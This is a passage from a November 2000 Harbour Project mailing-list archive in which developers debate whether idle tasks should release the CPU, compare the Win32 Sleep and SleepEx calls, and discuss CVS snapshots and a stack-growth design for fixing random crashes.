other processes. Harbour's IDLE functions don't have any relations in this 
respect.

This way my application will hog the CPU as soon as a 
I add _any_ idle functions. Like:

FUNCTION Main()
    Inkey( 0 ) // ; Everything is OK, time slice is released.
    HB_IDLEADD( {|| .T. } ) // ; Define any Harbour idle operation (this one will actually do nothing).
    Inkey( 0 ) // ; Problem: system is slowed down, because Harbour no more calls releaseCPU() at all.
    RETURN

Victor Szakats



From harbour@lists.harbour-project.org  Wed Nov 22 20:27:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Wed Nov 22 20:27:02 2000
Subject: [Harbour] 2000-11-21 18:35 UTC+0800 Ron Pinkas  <ron@profit-master.com>
In-Reply-To: <030201c054e5$43f33470$0a0ac8c8@VECWS1>
Message-ID: <LOBBKAFMMFGJIKLMEPAKIEFDDHAA.ron@profit-master.com>

Victor,

If I understand Maurilio's logic correctly, Harbour *will* release the CPU
just as soon as the IDLE Block will be evaluated.

IAE, once the application has something to do, it should *not* be considered
idle! If the app designer wanted the app to do something when not busy
performing explicit other tasks, Harbour should do exactly that.

Please remember that doing something at IDLE mode is *not* different than
doing it at any other time (in terms of adverse effect on the O/S
performance). Pre-Emptive O/S allocates time slices for each app/thread
based on requested priorities. Assuming the app requests normal priority, it
should have *no* adverse effect on the O/S performance, even if it was
performing an infinite loop.

The Sleep() kind of explicit act, of waiving the right to the allocated time
slice, is not a must, it is a voluntary act of courteousy, when the app has
*no* use for the allocated time slice.

Finally, most popular Multi-Tasking O/Ss have logic to detect, and
automatically "suspend", any task _waiting_ for I/O. I haven't read the
logic of our KB I/O routines, to see if we use logic that will correctly
imply such, but I understand that this can and should be done.

Ron

> Maurilio, Ron,
>
>
> > it is not a problem since our task will be preempted as soon as its
> > slice of cpu time ends or it starts any I/O operation.
> >
> > We have to release cpu _only_ when we don't have anything to do and not
> > from time to time.
>
> I think we should release CPU when we want to let the OS run
> itself and its
> other processes. Harbour's IDLE functions don't have any
> relations in this
> respect.
>
> This way my application will hog the CPU as soon as a
> I add _any_ idle functions. Like:
>
> FUNCTION Main()
>     Inkey( 0 ) // ; Everything is OK, time slice is released.
>     HB_IDLEADD( {|| .T. } ) // ; Define any Harbour idle
> operation (this one will actually do nothing).
>     Inkey( 0 ) // ; Problem: system is slowed down, because
> Harbour no more calls releaseCPU() at all.
>     RETURN
>
> Victor Szakats


From harbour@lists.harbour-project.org  Wed Nov 22 22:17:02 2000
From: harbour@lists.harbour-project.org (Paul Tucker)
Date: Wed Nov 22 22:17:02 2000
Subject: [Harbour] Win32 Sleep/SleepEx
References: <200011211830.eALIUnG08319@thor.parrett.net>
Message-ID: <001d01c054fb$90ca10a0$b671fea9@QUARRY>

David,

I found a minute to look up what I thought I had seen on time slices.  Here
it is.

(The text refers to int 2f-1680h)
"Only non-Windows programs should use Release Current VM Time-Slice; Windows
applications should yield by calling the WaitMessage function. A program can
call this function at any time, even when running in environments other than
Windows environment. If the current environment does not support the
function, the function returns and the program continues execution. "

"Windows suspends the current VM only if there is another VM scheduled to
run. If no other VM is ready, the function returns to the program and
execution continues. A program should call the function frequently (for
example, once during each pass of the program's idle loop) to give Windows
ample opportunity to check for other VMs that are ready for execution. "

WaitMessage says in part:  "Note that WaitMessage does not return if there
is unread input in the message queue after the thread has called a function
to check the queue."  That doesn't sound right, but it might be worth a
test.



Paul

----- Original Message -----

From: "David G. Holm" <dholm@jsd-llc.com>
To: <harbour@lists.harbour-project.org>
Sent: Tuesday, November 21, 2000 1:30 PM
Subject: Re: [Harbour] Win32 Sleep/SleepEx


> ** Reply to message from John Skelton <John_Skelton@compuserve.com> on
> Tue, 21 Nov 2000 11:26:00 -0500
>
> > Wouldn't a time of zero be OK, especially with SleepEx()?
>
> I tried SleepEx( 0, 1 ) and it appears to work exactly like a yield()
> function would, if one existed. And according to "Programming Windows
> 95", 4th edition, by Charles Petzold, Sleep( 0 ) does the same thing:
>
>    "A parameter of 0 to the Sleep function causes the thread to forfeit
> the remainder of its time slice."
>
> So I'm going to change from SleepEx( 0, 1 ) to Sleep( 0 ) and commit
> the change.
> --
> David G. Holm, Set Captain and all around
> Harbour Project Clipper Compatibility fanatic.
>


From harbour@lists.harbour-project.org  Thu Nov 23 03:25:03 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Thu Nov 23 03:25:03 2000
Subject: [Harbour] 2000-11-21 18:35 UTC+0800 Ron Pinkas
 <ron@profit-master.com>
References: <LOBBKAFMMFGJIKLMEPAKMEEODHAA.ron@profit-master.com> <02c601c054b3$2d1c6a50$0a0ac8c8@VECWS1> <3A1C5A7E.6D0FACA4@libero.it> <030201c054e5$43f33470$0a0ac8c8@VECWS1>
Message-ID: <3A1CD429.43CF8A4D@libero.it>

Victor,

consider for a moment a program like seti@home. it never releases any
cpu time and this is correct since the underlaying os will give it
little time slices from time to time.

Now, if you add an idle task with an empty loop (or you decide to draw a
mandelbrot set during idle time :-)) you cannot wonder that it will use
all available cpu time (and this is exactly what you may want to do).

But you cannot complain of this since _your code_ wants to execute all
available time. In a multitasking OS it is a good thing (not a required
one) that you tell to the OS "I'm idle, do what you want with my
remaining time slice".




Victor Szakats ha scritto:
> 
> Maurilio, Ron,
> 
> > it is not a problem since our task will be preempted as soon as its
> > slice of cpu time ends or it starts any I/O operation.
> >
> > We have to release cpu _only_ when we don't have anything to do and not
> > from time to time.
> 
> I think we should release CPU when we want to let the OS run itself and its
> other processes. Harbour's IDLE functions don't have any relations in this
> respect.
> 
> This way my application will hog the CPU as soon as a
> I add _any_ idle functions. Like:
> 
> FUNCTION Main()
>     Inkey( 0 ) // ; Everything is OK, time slice is released.
>     HB_IDLEADD( {|| .T. } ) // ; Define any Harbour idle operation (this one will actually do nothing).
>     Inkey( 0 ) // ; Problem: system is slowed down, because Harbour no more calls releaseCPU() at all.
>     RETURN
> 
> Victor Szakats
> 
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 
 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Thu Nov 23 03:33:01 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Thu Nov 23 03:33:01 2000
Subject: [Harbour] 2000-11-21 18:35 UTC+0800 Ron Pinkas
 <ron@profit-master.com>
References: <LOBBKAFMMFGJIKLMEPAKMEEODHAA.ron@profit-master.com> <02c601c054b3$2d1c6a50$0a0ac8c8@VECWS1> <3A1C5A7E.6D0FACA4@libero.it> <030201c054e5$43f33470$0a0ac8c8@VECWS1>
Message-ID: <3A1CD62A.89B8AAEA@libero.it>

Victor,

consider for a moment a program like seti@home. it never releases any
cpu time and this is correct since the underlaying os will give it
little time slices from time to time.

Now, if you add an idle task with an empty loop (or you decide to draw a
mandelbrot set during idle time :-)) you cannot wonder that it will use
all available cpu time (and this is exactly what you may want to do).

But you cannot complain of this since _your code_ wants to execute
during all available time. In a multitasking OS it is a good thing (not
a required one) that you tell to the OS "I'm idle, do what you want with
my remaining time slice".

Now, harbour runtime has to execute my code without trying to be kinder
to the OS than needed. I, the programmer, have to write my code as to
make it kind (or not) depending on _MY_ needs.

So harbour runtime should call releaseCPU if and only if there is
absolutely nothing it has to do. In any other case harbour runtime has
to execute my code _as it is_ and not introduce any slow down which
could make my code fail or behave incorrectly.

regards.


Victor Szakats ha scritto:
> 
> Maurilio, Ron,
> 
> > it is not a problem since our task will be preempted as soon as its
> > slice of cpu time ends or it starts any I/O operation.
> >
> > We have to release cpu _only_ when we don't have anything to do and not
> > from time to time.
> 
> I think we should release CPU when we want to let the OS run itself and its
> other processes. Harbour's IDLE functions don't have any relations in this
> respect.
> 
> This way my application will hog the CPU as soon as a
> I add _any_ idle functions. Like:
> 
> FUNCTION Main()
>     Inkey( 0 ) // ; Everything is OK, time slice is released.
>     HB_IDLEADD( {|| .T. } ) // ; Define any Harbour idle operation (this one will actually do nothing).
>     Inkey( 0 ) // ; Problem: system is slowed down, because Harbour no more calls releaseCPU() at all.
>     RETURN
> 
> Victor Szakats
> 
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 
 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Thu Nov 23 03:35:04 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Thu Nov 23 03:35:04 2000
Subject: [Harbour] 2000-11-21 18:35 UTC+0800 Ron Pinkas
 <ron@profit-master.com>
References: <LOBBKAFMMFGJIKLMEPAKMEEODHAA.ron@profit-master.com> <02c601c054b3$2d1c6a50$0a0ac8c8@VECWS1> <3A1C5A7E.6D0FACA4@libero.it> <030201c054e5$43f33470$0a0ac8c8@VECWS1> <3A1CD429.43CF8A4D@libero.it>
Message-ID: <3A1CD69B.A0AF3219@libero.it>

Sorry Victor,

wait my next answer, I fired to early :-))

Maurilio Longo ha scritto:
> 
> Victor,
> 
> consider for a moment a program like seti@home. it never releases any
> cpu time and this is correct since the underlaying os will give it
> little time slices from time to time.
> 
> Now, if you add an idle task with an empty loop (or you decide to draw a
> mandelbrot set during idle time :-)) you cannot wonder that it will use
> all available cpu time (and this is exactly what you may want to do).
> 
> But you cannot complain of this since _your code_ wants to execute all
> available time. In a multitasking OS it is a good thing (not a required
> one) that you tell to the OS "I'm idle, do what you want with my
> remaining time slice".
> 
> Victor Szakats ha scritto:
> >
> > Maurilio, Ron,
> >
> > > it is not a problem since our task will be preempted as soon as its
> > > slice of cpu time ends or it starts any I/O operation.
> > >
> > > We have to release cpu _only_ when we don't have anything to do and not
> > > from time to time.
> >
> > I think we should release CPU when we want to let the OS run itself and its
> > other processes. Harbour's IDLE functions don't have any relations in this
> > respect.
> >
> > This way my application will hog the CPU as soon as a
> > I add _any_ idle functions. Like:
> >
> > FUNCTION Main()
> >     Inkey( 0 ) // ; Everything is OK, time slice is released.
> >     HB_IDLEADD( {|| .T. } ) // ; Define any Harbour idle operation (this one will actually do nothing).
> >     Inkey( 0 ) // ; Problem: system is slowed down, because Harbour no more calls releaseCPU() at all.
> >     RETURN
> >
> > Victor Szakats
> >
> > _______________________________________________
> > Harbour mailing list
> > Harbour@lists.harbour-project.org
> > http://www.matrixlist.com/mailman/listinfo/harbour
> >
> > Thank you for participating in The Harbour Project.  Be sure to check
> > http://www.Harbour-Project.org
> 
> --
>  __________
> |  |  | |__| md2520@mclink.it
> |_|_|_|____| Team OS/2 Italia
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 
 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Thu Nov 23 03:41:02 2000
From: harbour@lists.harbour-project.org (Victor Szakats)
Date: Thu Nov 23 03:41:02 2000
Subject: [Harbour] 2000-11-21 18:35 UTC+0800 Ron Pinkas   <ron@profit-master.com>
References: <LOBBKAFMMFGJIKLMEPAKMEEODHAA.ron@profit-master.com> <02c601c054b3$2d1c6a50$0a0ac8c8@VECWS1> <3A1C5A7E.6D0FACA4@libero.it> <030201c054e5$43f33470$0a0ac8c8@VECWS1> <3A1CD429.43CF8A4D@libero.it>
Message-ID: <033001c05529$49c2b0d0$0a0ac8c8@VECWS1>

Maurilio,


> consider for a moment a program like seti@home. it never releases any
> cpu time and this is correct since the underlaying os will give it
> little time slices from time to time.

I would not compare our situation to SETI@HOME, since this ones 
goal is to use as much idle time as possible. This is far from the usual 
practice for business (or plain user) applications. If someone wants to 
write such a specifically background oriented application, that's rather 
the exception than the rule.

> Now, if you add an idle task with an empty loop (or you decide to draw a
> mandelbrot set during idle time :-)) you cannot wonder that it will use
> all available cpu time (and this is exactly what you may want to do).
> 
> But you cannot complain of this since _your code_ wants to execute all
> available time. In a multitasking OS it is a good thing (not a required
> one) that you tell to the OS "I'm idle, do what you want with my
> remaining time slice".

Maybe we have different views about the usage of the HB_IDLEADD() 
function.

In my view this function is there to perform small simple tasks like displaying 
a clock, checking for some messages arrived, or the existance of some semaphore  
files, and the like, but it's far from being something like a thread or a process (which 
could of course have the same priority when executing as the mainstream program 
code). 

Also note that you can't control the granularity of those idle tasks calls, Harbour 
will not even guarantee that they will called, but it may also happen that they will 
called in a tight loop.

>From this POV, I think that I would not welcome if Harbour would hog my 
whole OS, just because I have a DispOutAt( 0, 0, Time() ) in my app. OK 
I could add explicit CPU release calls for every idle tasks I start, but that's not 
too intuitive, will raise FAQs, and kind of hackish.

Victor Szakats



From harbour@lists.harbour-project.org  Thu Nov 23 03:43:01 2000
From: harbour@lists.harbour-project.org (Victor Szakats)
Date: Thu Nov 23 03:43:01 2000
Subject: [Harbour] 2000-11-21 18:35 UTC+0800 Ron Pinkas  <ron@profit-master.com>
References: <LOBBKAFMMFGJIKLMEPAKIEFDDHAA.ron@profit-master.com>
Message-ID: <033301c05529$919d9e60$0a0ac8c8@VECWS1>

Ron,

> If I understand Maurilio's logic correctly, Harbour *will* release the CPU
> just as soon as the IDLE Block will be evaluated.

That's fine then.

> IAE, once the application has something to do, it should *not* be considered
> idle! If the app designer wanted the app to do something when not busy
> performing explicit other tasks, Harbour should do exactly that.
> 
> Please remember that doing something at IDLE mode is *not* different than
> doing it at any other time (in terms of adverse effect on the O/S
> performance).

I disagree here, an _idle_ task is an idle task, it's not a Harbour thread, it's 
not mainstream/priority application code, so it should be performed whenever 
Harbour has some free time, and it should not hog the CPU that easily. If you 
check my small example I think it should be obvious why I say this.

If idle tasks would disable CPU releasing, it would simply cause that 
every programmer will have add explicit CPU release calls to them, 
and that would be an unnecessary hack.

> Pre-Emptive O/S allocates time slices for each app/thread
> based on requested priorities. Assuming the app requests normal priority, it
> should have *no* adverse effect on the O/S performance, even if it was
> performing an infinite loop.

That's fine, but in practice it's still not wise for an application to use 
9x% of the CPU time for nothing, and Harbour (or CA-Clipper for 
that matter) will easily use that amount even under WinNT/2K.

> The Sleep() kind of explicit act, of waiving the right to the allocated time
> slice, is not a must, it is a voluntary act of courteousy, when the app has
> *no* use for the allocated time slice.

Yes it is an explicit act, and every well behaving application should call 
it whenever it has nothing to do.

> Finally, most popular Multi-Tasking O/Ss have logic to detect, and
> automatically "suspend", any task _waiting_ for I/O. I haven't read the
> logic of our KB I/O routines, to see if we use logic that will correctly
> imply such, but I understand that this can and should be done.

Whatever the theory is, in practice Harbour/CA-Clipper (*) will 
hog the CPU quite much without any explicit help from the application.

<AD>
(*) That's why I wrote the DOS Protected Mode compatible CPU 
releasing function OL_Yield() in the OSLIB package of Dave Pearson.
</AD>

Victor Szakats



From harbour@lists.harbour-project.org  Thu Nov 23 03:45:04 2000
From: harbour@lists.harbour-project.org (Victor Szakats)
Date: Thu Nov 23 03:45:04 2000
Subject: [Harbour] 2000-11-21 18:35 UTC+0800 Ron Pinkas   <ron@profit-master.com>
References: <LOBBKAFMMFGJIKLMEPAKMEEODHAA.ron@profit-master.com> <02c601c054b3$2d1c6a50$0a0ac8c8@VECWS1> <3A1C5A7E.6D0FACA4@libero.it> <030201c054e5$43f33470$0a0ac8c8@VECWS1> <3A1CD429.43CF8A4D@libero.it> <3A1CD69B.A0AF3219@libero.it>
Message-ID: <034901c05529$cb592110$0a0ac8c8@VECWS1>

> Sorry Victor,
> 
> wait my next answer, I fired to early :-))

and I shoot back very quickly :)

I'm reading along...

Victor Szakats



From harbour@lists.harbour-project.org  Thu Nov 23 05:19:01 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Thu Nov 23 05:19:01 2000
Subject: [Harbour] 2000-11-21 18:35 UTC+0800 Ron Pinkas
 <ron@profit-master.com>
References: <LOBBKAFMMFGJIKLMEPAKMEEODHAA.ron@profit-master.com> <02c601c054b3$2d1c6a50$0a0ac8c8@VECWS1> <3A1C5A7E.6D0FACA4@libero.it> <030201c054e5$43f33470$0a0ac8c8@VECWS1> <3A1CD429.43CF8A4D@libero.it> <033001c05529$49c2b0d0$0a0ac8c8@VECWS1>
Message-ID: <3A1CEEDF.50D016AC@libero.it>

Please Victor,

reread my message with pseudo code in it, after calling each idle_task
it looks whether there are keys pending, if not it releases cpu.

That is, every time harbour becomes idle it calls _only once_ every idle
task present then it issues a releaseCPU() call.

If you have {|| @1,1 dispout(date())} as an idle task this uses _a lot
less_ than a time slice to execute (and will probably block and get
preempted inside underlaying OS date() function call) and then will call
releaseCPU to give away the rest of its time slice.

To hog cpu you need a lot of idle tasks none of which doing any kind of
I/O.

regards.

Victor Szakats ha scritto:
> 
> Maurilio,
> 
> > consider for a moment a program like seti@home. it never releases any
> > cpu time and this is correct since the underlaying os will give it
> > little time slices from time to time.
> 
> I would not compare our situation to SETI@HOME, since this ones
> goal is to use as much idle time as possible. This is far from the usual
> practice for business (or plain user) applications. If someone wants to
> write such a specifically background oriented application, that's rather
> the exception than the rule.
> 
> > Now, if you add an idle task with an empty loop (or you decide to draw a
> > mandelbrot set during idle time :-)) you cannot wonder that it will use
> > all available cpu time (and this is exactly what you may want to do).
> >
> > But you cannot complain of this since _your code_ wants to execute all
> > available time. In a multitasking OS it is a good thing (not a required
> > one) that you tell to the OS "I'm idle, do what you want with my
> > remaining time slice".
> 
> Maybe we have different views about the usage of the HB_IDLEADD()
> function.
> 
> In my view this function is there to perform small simple tasks like displaying
> a clock, checking for some messages arrived, or the existance of some semaphore
> files, and the like, but it's far from being something like a thread or a process (which
> could of course have the same priority when executing as the mainstream program
> code).
> 
> Also note that you can't control the granularity of those idle tasks calls, Harbour
> will not even guarantee that they will called, but it may also happen that they will
> called in a tight loop.
> 
> >From this POV, I think that I would not welcome if Harbour would hog my
> whole OS, just because I have a DispOutAt( 0, 0, Time() ) in my app. OK
> I could add explicit CPU release calls for every idle tasks I start, but that's not
> too intuitive, will raise FAQs, and kind of hackish.
> 
> Victor Szakats
> 
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 
 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Thu Nov 23 06:20:03 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Thu Nov 23 06:20:03 2000
Subject: [Harbour] Win32 Sleep/SleepEx
Message-ID: <200011230618_MC2-BBDF-53E4@compuserve.com>

Paul,

Sleep/SleepEx() probably (!) work for a console app, but I'm not sure
whether WaitMessage() would be OK.

The (huge!) MS docs I have don't appear to say. :-(  As usual!!

MS should definitely WTFM.

John.

From harbour@lists.harbour-project.org  Thu Nov 23 06:20:28 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Thu Nov 23 06:20:28 2000
Subject: [Harbour] getting old CVS snapshots
Message-ID: <200011230618_MC2-BBDF-53E6@compuserve.com>

Ron & David,

Thanks.

Unfortunately I don't know which files I need.  I was going to try
a sort of binary search to find the last date when the feature worked,
and thus when it broke, then find what changed between the two.

I planned to grab the whole tree for both working and broken versions,
then do a diff on the trees.  But first I need the trees.

Oh well, there is another way (Hi Jean!)...

John.

From harbour@lists.harbour-project.org  Thu Nov 23 06:59:02 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Thu Nov 23 06:59:02 2000
Subject: [Harbour] getting old CVS snapshots
In-Reply-To: <200011230618_MC2-BBDF-53E6@compuserve.com>
Message-ID: <3A1D158F.24511.3C4EED1@localhost>

On 23 Nov 2000, at 6:18, John Skelton wrote:

> I planned to grab the whole tree for both working and broken versions,
> then do a diff on the trees.  But first I need the trees.

  Maybe it will be faster if you write what is broken ;-)

Regards, Ryszard

From harbour@lists.harbour-project.org  Thu Nov 23 07:22:02 2000
From: harbour@lists.harbour-project.org (Paul Tucker)
Date: Thu Nov 23 07:22:02 2000
Subject: [Harbour] Win32 Sleep/SleepEx
References: <200011230618_MC2-BBDF-53E4@compuserve.com>
Message-ID: <009b01c05547$b2b047b0$b671fea9@QUARRY>

John,

Sleep/Ex() sound like the ones to use.  I wasn't really suggesting
WaitMessage()  - just pointing out the apparent contradiction in what the
MS docs say.

>>MS should definitely WTFM.

Gets a <BG> from Me!

Paul
----- Original Message -----
From: "John Skelton" <John_Skelton@compuserve.com>
To: <harbour@lists.harbour-project.org>
Sent: Thursday, November 23, 2000 6:18 AM
Subject: Re: [Harbour] Win32 Sleep/SleepEx


Paul,

Sleep/SleepEx() probably (!) work for a console app, but I'm not sure
whether WaitMessage() would be OK.

The (huge!) MS docs I have don't appear to say. :-(  As usual!!

MS should definitely WTFM.

John.



From harbour@lists.harbour-project.org  Thu Nov 23 08:42:02 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Thu Nov 23 08:42:02 2000
Subject: [Harbour] CHANGELOG: 2000-11-23 13:32 GMT+1
Message-ID: <3A1D1E79.5382D97B@libero.it>

2000-11-23 13:32 GMT+1 Maurilio Longo <maurilio.longo@libero.it>
   * source/rtl/teditor.prg
      ! fixed K_DEL handling
   * source/rtl/idle.c
      ! fixed / changed to release cpu only if there are no pending
keys. Works ok
        under OS/2. Please test under win32 (linux still lacks system
call to release cpu).
        Note: since I can enter hb_IdleState() while waiting a certain
amount of time to
              elapse (ie. Inkey(.1)) I cannot keep calling idle tasks
but I have to exit
              hb_IdleState() every time an idle task has ended its
execution. If I have
              time left to wait I'll reenter hb_IdleState() immediatly
(executing next
              idle task).

-- 
 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Thu Nov 23 09:35:04 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Thu Nov 23 09:35:04 2000
Subject: [Harbour] getting old CVS snapshots
Message-ID: <200011230933_MC2-BBEC-8F8@compuserve.com>

Ryszard,

"Maybe it will be faster if you write what is broken ;-)"

Not a chance. :-(

Otherwise, I probably would already have done so!  Replacing part of
the OOP might mean I have to replace a lot of the OOP, and neither
looks attractive.

John.

From harbour@lists.harbour-project.org  Thu Nov 23 09:58:02 2000
From: harbour@lists.harbour-project.org (Patrick Mast, Harbour)
Date: Thu Nov 23 09:58:02 2000
Subject: [Harbour] Mailing list info on the Harbour page (Patrick)
In-Reply-To: <011301c04e20$e4278890$0a0ac8c8@VECWS1>
Message-ID: <NCBBJKNMIDPJNLJCHCHIGEGEFJAA.harbour@winfakt.com>

Victor,
 
> The "Mailing List" page of the Harbour homepage 
> is still pointing to the abandoned egroups lists.

I was at Comdex past week, I will fix it as soon as possible.

regards,

Patrick Mast
www.Patrick.Be.kz

From harbour@lists.harbour-project.org  Thu Nov 23 10:00:04 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Thu Nov 23 10:00:04 2000
Subject: [Harbour] getting old CVS snapshots
In-Reply-To: <200011230933_MC2-BBEC-8F8@compuserve.com>
Message-ID: <3A1D4004.21498.46AC814@localhost>

On 23 Nov 2000, at 9:33, John Skelton wrote:

> Otherwise, I probably would already have done so!  Replacing part of
> the OOP might mean I have to replace a lot of the OOP, and neither
> looks attractive.

 Sorry for misunderstanding. I meant: write an information about what 
is broken instead of writing a solution for it :)

Regards, Ryszard

From harbour@lists.harbour-project.org  Thu Nov 23 10:12:02 2000
From: harbour@lists.harbour-project.org (Victor Szakats)
Date: Thu Nov 23 10:12:02 2000
Subject: [Harbour] Mailing list info on the Harbour page (Patrick)
References: <NCBBJKNMIDPJNLJCHCHIGEGEFJAA.harbour@winfakt.com>
Message-ID: <03ad01c0555f$e06f52a0$0a0ac8c8@VECWS1>

> > The "Mailing List" page of the Harbour homepage 
> > is still pointing to the abandoned egroups lists.
> 
> I was at Comdex past week, I will fix it as soon as possible.

Thanks Patrick!

Victor Szakats



From harbour@lists.harbour-project.org  Thu Nov 23 10:30:06 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Thu Nov 23 10:30:06 2000
Subject: [Harbour] Mailing list info on the Harbour page (Patrick)
In-Reply-To: <NCBBJKNMIDPJNLJCHCHIGEGEFJAA.harbour@winfakt.com>
Message-ID: <LOBBKAFMMFGJIKLMEPAKEEFJDHAA.ron@profit-master.com>

Patrick,

I got your postcard thanks! (if you had told me, we could have meet, I was
there to :-)

Ron

> Victor,
>
> > The "Mailing List" page of the Harbour homepage
> > is still pointing to the abandoned egroups lists.
>
> I was at Comdex past week, I will fix it as soon as possible.
>
> regards,
>
> Patrick Mast
> www.Patrick.Be.kz


From harbour@lists.harbour-project.org  Thu Nov 23 10:30:42 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Thu Nov 23 10:30:42 2000
Subject: [Harbour] Alaska's site
Message-ID: <3A1D37F3.78422828@libero.it>

They're talking about us (here and there) :-)


http://www.alaska-software.com/e/press/articles.html#nov16


regards.


-- 
 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Thu Nov 23 10:32:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Thu Nov 23 10:32:02 2000
Subject: [Harbour] getting old CVS snapshots
In-Reply-To: <200011230933_MC2-BBEC-8F8@compuserve.com>
Message-ID: <LOBBKAFMMFGJIKLMEPAKIEFJDHAA.ron@profit-master.com>

John,

I believe Ryszard suggested you simply report, what is broken. I join this
suggestion.

Ron

> Ryszard,
>
> "Maybe it will be faster if you write what is broken ;-)"
>
> Not a chance. :-(
>
> Otherwise, I probably would already have done so!  Replacing part of
> the OOP might mean I have to replace a lot of the OOP, and neither
> looks attractive.
>
> John.


From harbour@lists.harbour-project.org  Thu Nov 23 10:32:34 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Thu Nov 23 10:32:34 2000
Subject: [Harbour] Random gpfs
In-Reply-To: <200011211838_MC2-BBBE-B713@compuserve.com>
Message-ID: <3A1D477D.5989.487F8EE@localhost>

On 21 Nov 2000, at 18:37, John Skelton wrote:

> BTW, a linked list stack would not be my first choice.
> 
> OTOH, a stack which moves around also isn't...

  I am thinking about a linked list of stack blocks instead of a 
linked list of single items. This will give a possibility to safe 
stack growth and at the same time will not decrease accessing speed 
significantly.

  What other alternatives are available?

Regards, Ryszard

From harbour@lists.harbour-project.org  Thu Nov 23 10:49:02 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Thu Nov 23 10:49:02 2000
Subject: [Harbour] Random gpfs
References: <3A1D477D.5989.487F8EE@localhost>
Message-ID: <3A1D3C26.D0D49061@libero.it>

Ryszard,

it was my idea too (the linked list of blocks of stack, I mean). I don't
think we have other solutions (apart from my idea of a block of memory
to commit piece by piece as need arises).

regards.



Ryszard Glab ha scritto:
> 
> On 21 Nov 2000, at 18:37, John Skelton wrote:
> 
> > BTW, a linked list stack would not be my first choice.
> >
> > OTOH, a stack which moves around also isn't...
> 
>   I am thinking about a linked list of stack blocks instead of a
> linked list of single items. This will give a possibility to safe
> stack growth and at the same time will not decrease accessing speed
> significantly.
> 
>   What other alternatives are available?
> 
> Regards, Ryszard
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 
 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Thu Nov 23 10:50:03 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Thu Nov 23 10:50:03 2000
Subject: [Harbour] 2000-11-21 18:35 UTC+0800 Ron Pinkas  <ron@profit-master.com>
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKOEFBDHAA.ron@profit-master.com>
References: <3A1C17EA.426.510314@localhost>
Message-ID: <3A1D4BA8.175.4983F78@localhost>

On 22 Nov 2000, at 15:44, Ron Pinkas wrote:

> Once we do enter an IDLE mode, where ReleaseCPU() is a _candidate_, it
> makes no sense to release the CPU *before* we complete pending tasks!

  Sorry, I don't understand it. What is a _candidate_?
The overall time spent inside hb_idleState() will be the same 
regardless of the order of ReleaseCPU() call. Releasing of CPU is one 
of idle tasks that have the same prioryty as all other idle tasks 
then it has to be executed.

> Therefore, the order of the functions calls *is* indeed very
> important. We should *not* release Harbour Application's time slice,
> until _when_and_if_ we completed all pending tasks. Then if the
> application is still IDLE, and we have *no* further use for our
> remaining time slice (until we get the desired I/O input), we should
> release the CPU.

  No. IMHO releasing CPU is just another idle task that have to be 
executed to allow proper cooperation with other applications. The 
harbour application have to share resources with other applications.
If we will not call it then the user will have to add manual call for 
CPU releasing, probably as another idle task, that will increase a 
time that will be wasted (due additional overhead of codeblock 
evaluation and a function call).

Regards, Ryszard

From harbour@lists.harbour-project.org  Thu Nov 23 11:06:03 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Thu Nov 23 11:06:03 2000
Subject: [Harbour] Random gpfs
In-Reply-To: <3A1D477D.5989.487F8EE@localhost>
Message-ID: <LOBBKAFMMFGJIKLMEPAKIEFKDHAA.ron@profit-master.com>

Great idea.

> > BTW, a linked list stack would not be my first choice.
> > 
> > OTOH, a stack which moves around also isn't...
> 
>   I am thinking about a linked list of stack blocks instead of a 
> linked list of single items. This will give a possibility to safe 
> stack growth and at the same time will not decrease accessing speed 
> significantly.
> 
>   What other alternatives are available?
> 
> Regards, Ryszard


From harbour@lists.harbour-project.org  Thu Nov 23 11:12:02 2000
